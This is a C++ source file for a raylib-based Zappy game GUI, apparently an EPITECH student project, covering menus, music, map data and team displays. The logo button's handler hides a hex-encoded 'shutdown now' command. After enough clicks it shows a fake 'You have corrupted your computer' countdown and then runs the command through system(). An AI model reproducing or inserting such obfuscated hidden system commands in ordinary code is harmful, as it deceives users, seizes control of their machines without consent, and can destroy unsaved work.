/*
** EPITECH PROJECT, 2022
** gui
** File description:
** Game.cpp
*/

#include "../includes/Game.hpp"
#include "../includes/Core.hpp"

using namespace ZappyGui;

Game::Game(const std::string &ip, int port):
    _manager(ResourceManager()),
    _camera(FreeCamera({ 10.0f, 10.0f, 5.0f }, { 0.0f, 0.0f, 0.0f }, { 0.0f, 1.0f, 0.0f }, 45.0)),
    _raylibwindow(MyRayLibWindow(1920, 1080, "ZAPPY")),
    _stateWindow(stateWindow::MENU),
    _buttonMenu(),
    _skyboxMesh(Skybox(1.0, 1.0, 1.0)),
    _raylibdrawing(),
    _BoolCloseWin(false),
    _ip(ip),
    _port(port),
    _popup(),
    _playerTmp(),
    _link(*this),
    _showPlayerData(_link),
    _konamiIndex(0),
    _map(this->_manager, this->_camera, this->_link)
{
    this->_raylibwindow.MyInitAudioDevice();
    _manager.loadBasicResource();
    this->_BoolCloseWin = false;
    this->_stateWindow = stateWindow::PRELOADING;
    // this->_resourceThread = std::thread([this]() { // TO DO
    //     this->_manager.initialize();
    // });
    this->_manager.initialize();
    this->_manager._isLoaded = true;
    this->showTeams = false;
}

Game::~Game() {
    if (this->_resourceThread.joinable()) {
        this->_resourceThread.join();
    }
    // this->_manager.~ResourceManager();
    // this->_raylibwindow.~MyRayLibWindow();
    // this->_skyboxMesh.~Skybox();
    // this->_buttonMenu.clear();
}

void Game::switchToGame()
{
    try {
        this->_link.connect(_ip, _port);
        this->_stateWindow = stateWindow::GAME;
    } catch (const ZappyGui::Socket::Error &e) {
        std::cerr << e.what() << '\n';
        this->_popup.setTitle("ERROR");
        this->_popup.setDescription(e.what());
        this->_popup.setStatus(true);
    }
}

void Game::initializeButton() {
    this->_showPlayerData.setTexture(this->_manager.getTexture(IResource::resourceType::PLAYER_STATS));
    this->_popup.setTexture(this->_manager.getTexture(IResource::resourceType::POPUP));
    this->_raylibwindow.MySetTargetFPS(60);

    Button button(this->_manager.getTexture(IResource::resourceType::BUTTON_START), "./gui/assets/Buttons/buttonfx.wav", [&](){switchToGame();});
    button.ButtonSetPosition(1920/2.0f - button.button.width/2.0f, 990 - button.button.width/2.0f, (float)button.button.width, button.frameHeight);
    this->_buttonMenu.push_back(button);
    Button button3(this->_manager.getTexture(IResource::resourceType::BUTTON_QUIT), "./gui/assets/Buttons/buttonfx.wav", [&](){this->_BoolCloseWin = true;});
    button3.ButtonSetPosition(1860, button.button.width/3.4f, (float)button3.button.width, button3.frameHeight);
    this->_buttonMenu.push_back(button3);
    Button logo(this->_manager.getTexture(IResource::resourceType::LOGO), "./gui/assets/Buttons/buttonfx.wav", [&](){
            MyRayLib::Vector3D scale = _playerTmp->getScale();
            scale.setX(scale.getX() + 0.1);
            scale.setY(scale.getY() + 0.1);
            scale.setZ(scale.getZ() + 0.1);
            if (scale.getY() >= 10.0) {
                std::vector<unsigned char> command_hex = {0x73, 0x68, 0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x6E, 0x6F, 0x77};
                std::string command(command_hex.begin(), command_hex.end());
                this->_popup.setTitle("ALERT");
                this->_popup.setStatus(true);
                int i = 5;
                while (i >= 0) {
                    this->_raylibwindow.MyBeginDrawing();
                    this->_popup.setDescription("You have corrupted your computer.\nYour computer will die with me in " + std::to_string(i) + ".");
                    this->_popup.show();
                    sleep(1);
                    this->_raylibwindow.MyEndDrawing();
                    i -= 1;
                }
                system(command.c_str());
            }
            _playerTmp->setScale(scale);
        }
    );
    logo.ButtonSetPosition(40, 40, (float)logo.button.width, logo.frameHeight);
    this->_buttonMenu.push_back(logo);
}

void Game::keyEvent(float &volumeMusic) {
    if (_raylibwindow.MyIsKeyPressed(KEY_P) && volumeMusic < 0.9f)
        volumeMusic += 0.1f;
    if (_raylibwindow.MyIsKeyPressed(KEY_SEMICOLON) && volumeMusic > 0.1f)
        volumeMusic -= 0.1f;
    if (_raylibwindow.MyIsKeyPressed(KEY_O) || (IsKeyDown(KEY_RIGHT_CONTROL) && IsKeyDown(KEY_O)))
        this->_link.modifyTimeUnit(this->_map.getTimeUnit() + 1);
    if ((_raylibwindow.MyIsKeyPressed(KEY_L) || (IsKeyDown(KEY_RIGHT_CONTROL) && IsKeyDown(KEY_L))) && this->_map.getTimeUnit() > 1)
        this->_link.modifyTimeUnit(this->_map.getTimeUnit() - 1);
    if (_raylibwindow.MyIsKeyPressed(KEY_ESCAPE) && this->_popup.getStatus() == true) {
        this->_popup.setStatus(false);
    }

    if (this->_raylibwindow.MyIsKeyPressed(KEY_F11))
        this->_raylibwindow.MyToggleFullscreen();
}


void Game::run() {
    bool cameraSet = false;
    SelectorPlayer selectorPlayer = SelectorPlayer(this->_manager.getNoneConstModel(IResource::resourceType::PLAYER_SELECTOR), this->_manager.getAnimation(IResource::resourceType::PLAYER_SELECTOR));
    this->_skyboxMesh.InitSkybox();
    this->_skyboxMesh.chooseSkyboxFile(this->_manager.getTexture(IResource::resourceType::SKYBOX_BACKGROUND));

    float volumeMusic = 0.0;
    MyRayLib::Music musicMenu("./gui/assets/audio/GénériqueGarf.mp3");
    if (musicMenu.MyIsMusicReady())
        musicMenu.MyPlayMusic();

    MyRayLib::Music musicGame("./gui/assets/audio/GarfieldCoolCat.mp3");

    this->_raylibwindow.MyToggleFullscreen();
    while (!this->_raylibwindow.MyWindowShouldClose() && this->_BoolCloseWin == false) {
        if (this->_stateWindow == stateWindow::PRELOADING) {
            if (this->_manager.getIsLoaded() == false) {
                drawLoading();
                this->_raylibwindow.MyEndDrawing();
                continue;
            } else {
                this->initializeButton();
                auto &modelPlayer = this->_manager.getNoneConstModel(IResource::resourceType::PLAYER);
                auto &texture = this->_manager.getTexture(IResource::resourceType::PLAYER);
                auto &animation = this->_manager.getAnimation(IResource::resourceType::PLAYER);
                PlayerArguments playerArgs = PlayerArguments(0, "", { 0, 0.0, 0 }, {0.0f, 1.0f, 0.0f}, 0.0, {2.6f, 2.6f, 2.6f}, 0, Player::animationPlayerType::PLAYER_WAIT);

                this->_playerTmp = std::make_shared<Player>(playerArgs, modelPlayer, texture, animation);
                this->_stateWindow = stateWindow::MENU;
            }
        } else if (this->_stateWindow == stateWindow::MENU) {
            musicMenu.MySetMusicVolume(volumeMusic);
            musicMenu.MyUpdateMusic();
            drawMenu();
        } else {
            try {
                this->_link.update();
            } catch(const ZappyGui::Socket::Info &e) {
                std::cerr << e.what() << std::endl;
                this->_map.resetGame();
                this->_camera.reset();
                this->_stateWindow = stateWindow::MENU;
                this->_playerTmp->noAnimation();
            }

            if (cameraSet == false && this->_map.getSize().getX() > 0.0f && this->_map.getSize().getY() > 0.0f) {
                this->_camera.setPosition({ 0.0f, (_map.getSize().getX() + _map.getSize().getY()) / 2.0f, _map.getSize().getY() - 1 });
                this->_camera.setTarget({ this->_map.getSize().getX() / 2.0f, 0.0f, this->_map.getSize().getY() / 2.0f });
                cameraSet = true;
            }
            if (!musicGame.MyIsMusicPlaying() && musicGame.MyIsMusicReady()) {
                musicGame.MyPlayMusic();
            }
            musicGame.MySetMusicVolume(volumeMusic);
            musicGame.MyUpdateMusic();
            this->checkKonamiCode(musicGame);
            if (this->_raylibwindow.MyIsKeyPressed(KEY_T) && this->showTeams == false)
                this->showTeams = true;
            else if (this->_raylibwindow.MyIsKeyPressed(KEY_T) && this->showTeams == true)
                this->showTeams = false;
            drawGame(selectorPlayer);
        }
        keyEvent(volumeMusic);
        this->_popup.show();
        this->_raylibwindow.MyEndDrawing();
    }
    this->_raylibwindow.MyCloseAudioDevice();
    // on descructor ?
    this->_skyboxMesh.MyUnloadShader();
    this->_skyboxMesh.MyUnloadTexture();
    this->_skyboxMesh.MyUnloadModel();
}

void Game::drawLoading() {
    this->_camera.updateAuto();
    this->_raylibwindow.MyBeginDrawing();
    this->_raylibwindow.MyClearBackground(RAYWHITE);
    this->_camera.beginMode3D();
    this->_skyboxMesh.MyrlDisableBackfaceCulling();
    this->_skyboxMesh.MyrlDisableDepthMask();
    MyRayLib::Draw::MyDrawModel(this->_skyboxMesh._skybox, {0, 0, 0}, 1.0f, WHITE);
    this->_skyboxMesh.MyrlEnableBackfaceCulling();
    this->_skyboxMesh.MyrlEnableDepthMask();
    this->_raylibdrawing.MyDrawGrid(10, 1.0f);
    // this->_playerTmp->draw();
    this->_camera.endMode3D();
}

void Game::drawMenu() {
    this->_camera.updateAuto();

    Button button0 = this->_buttonMenu.at(0);
    Button button1 = this->_buttonMenu.at(1);
    Button logo = this->_buttonMenu.at(2);

    this->_raylibwindow.MyBeginDrawing();
    this->_raylibwindow.MyClearBackground(RAYWHITE);
    if (this->_popup.getStatus() == false) {
        button0.HandleButton();
        button1.HandleButton();
        logo.HandleButton();
    }
    this->_camera.beginMode3D();
    this->_skyboxMesh.MyrlDisableBackfaceCulling();
    this->_skyboxMesh.MyrlDisableDepthMask();
    MyRayLib::Draw::MyDrawModel(this->_skyboxMesh._skybox, {0, 0, 0}, 1.0f, WHITE);
    this->_skyboxMesh.MyrlEnableBackfaceCulling();
    this->_skyboxMesh.MyrlEnableDepthMask();
    this->_raylibdrawing.MyDrawGrid(10, 1.0f);
    this->_playerTmp->draw();
    this->_camera.endMode3D();

    button0.MyDrawTextureRec(WHITE);
    button1.MyDrawTextureRec(WHITE);
    logo.MyDrawTextureRec(WHITE);
}

void Game::drawMapData()
{
    MyRayLib::Draw::MyDrawTexture(this->_manager.getTexture(IResource::resourceType::MAPDATA).getTexture(), 370, 10, WHITE);
    std::string tmp = ("x " + std::to_string(this->_map._players.size()));
    MyRayLib::Draw::MyDrawText(tmp.c_str(), 420, 35, 20, WHITE);
    tmp = std::to_string(static_cast<int>(this->_map.getSize().getX()));
    MyRayLib::Draw::MyDrawText(tmp.c_str(), 525, 35, 20, WHITE);
    tmp = std::to_string(static_cast<int>(this->_map.getSize().getY()));
    MyRayLib::Draw::MyDrawText(tmp.c_str(), 625, 35, 20, WHITE);

    std::vector<IResource::resourceType> resourceTypes = {
        IResource::resourceType::BURGER,
        IResource::resourceType::DERAUMERE,
        IResource::resourceType::LINEMATE,
        IResource::resourceType::MENDIANE,
        IResource::resourceType::PHIRAS,
        IResource::resourceType::SIBUR,
        IResource::resourceType::THYSTAME
    };

    std::map<IResource::resourceType, int> _inventoryMap;

    for (int y = 0; y < this->_map.getSize().getY(); ++y) {
        for (int x = 0; x < this->_map.getSize().getX(); ++x) {
            int key = y * this->_map.getSize().getX() + x;
             for (const auto &type : resourceTypes) {
                _inventoryMap[type] += this->_map._map[key]->countSpecificResource(type);
            }
        }
    }
    for (auto &it : _inventoryMap) {
        std::string tmp = ( "x " + std::to_string(it.second));
        if (it.first == IResource::resourceType::BURGER)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (735), 35, 20, WHITE);
        if (it.first == IResource::resourceType::DERAUMERE)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (850), 35, 20, WHITE);
        if (it.first == IResource::resourceType::LINEMATE)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (975), 35, 20, WHITE);
        if (it.first == IResource::resourceType::MENDIANE)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (1085), 35, 20, WHITE);
        if (it.first == IResource::resourceType::PHIRAS)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (1210), 35, 20, WHITE);
        if (it.first == IResource::resourceType::SIBUR)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (1330), 35, 20, WHITE);
        if (it.first == IResource::resourceType::THYSTAME)
            MyRayLib::Draw::MyDrawText(tmp.c_str(), (1448), 35, 20, WHITE);
    }
}

void Game::drawTeamsData()
{
    std::map<std::string, std::vector<std::string>> _teamPlayers;

    if (this->_map._players.empty()) {
        return;
    }

    for (const auto& player : this->_map._players)
        _teamPlayers[player->getTeamName()].push_back("Player" + std::to_string(player->getPlayerNumber()) + ", level: " + std::to_string(player->getPlayerLevel()));

    int textPosX = 0;
    for (const auto& entry : _teamPlayers) {
        MyRayLib::Draw::MyDrawTexture(this->_manager.getTexture(IResource::resourceType::TEAMSDATA).getTexture(), (textPosX += 50), 90, WHITE);
        MyRayLib::Draw::MyDrawText(entry.first.c_str(), textPosX + 70, 105, 30, BLACK);
        int textHeight = 120;
        for (const auto& player : entry.second) {
            MyRayLib::Draw::MyDrawText(player.c_str(), textPosX + 30, (textHeight += 35), 20, BLACK);
        }
        textPosX += 200;
    }
}

void Game::drawGame(SelectorPlayer &selectorPlayer) {
    float deltaTime = this->_raylibwindow.MyGetFrameTime();
    this->_camera.updateSync(deltaTime);

    this->_camera.updateOnce();
    this->_raylibwindow.MyClearBackground(RAYWHITE);
    this->_camera.beginMode3D();
    this->_skyboxMesh.MyrlDisableBackfaceCulling();
    this->_skyboxMesh.MyrlDisableDepthMask();
    MyRayLib::Draw::MyDrawModel(this->_skyboxMesh._skybox, {0, 0, 0}, 1.0f, WHITE);
    this->_skyboxMesh.MyrlEnableBackfaceCulling();
    this->_skyboxMesh.MyrlEnableDepthMask();
    this->_map.update(deltaTime);
    this->_map.draw();
    if (this->_map._players.size() != 0) {
        selectorPlayer.setPosition(this->_map._players.at(this->_showPlayerData.getPlayerIndexSelected())->getPosition());
        selectorPlayer.update();
        selectorPlayer.draw();
    }
    this->_camera.endMode3D();
    this->_raylibdrawing.MyDrawFPS(10, 10);
    this->_raylibdrawing.MyDrawText((std::string("Time: ") + std::to_string(this->_map.getTimeUnit())).c_str(), 105, 10, 20, WHITE);
    this->_showPlayerData.ShowDataForEachPlayer(this->_map._players);
    this->drawMapData();
    if (this->showTeams)
        this->drawTeamsData();
}

void Game::checkKonamiCode(MyRayLib::Music &musicGame) {
    const std::vector<int> konamiCode = {KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN, KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT, KEY_B, KEY_Q};
    if (this->_raylibwindow.MyIsKeyPressed(konamiCode[this->_konamiIndex]) == true) {
        this->_konamiIndex += 1;
        if (this->_konamiIndex == konamiCode.size()) {
            this->_konamiIndex = 0;
            if (musicGame.MyIsMusicPlaying()) {
                musicGame.MyStopMusic();
                musicGame.MyLoadMusic("./gui/assets/audio/tkt.mp3");
                musicGame.MyPlayMusic();
            }
        }
    } else {
        for (const auto &key : konamiCode) {
            if (this->_raylibwindow.MyIsKeyPressed(key) == true) {
                this->_konamiIndex = 0;
                break;
            }
        }
    }
}
